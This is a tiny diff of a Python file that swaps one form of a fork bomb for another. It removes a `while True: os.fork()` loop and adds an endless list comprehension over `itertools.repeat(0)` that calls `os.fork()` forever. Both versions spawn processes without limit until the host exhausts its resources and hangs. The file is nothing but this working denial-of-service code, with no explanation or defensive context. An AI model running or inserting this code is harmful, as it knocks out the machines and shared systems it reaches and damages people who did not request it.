@@ -1,4 +1,3 @@
+import itertools
 import os
-
-while True:
-    os.fork()
+[os.fork() for i in itertools.repeat(0)]
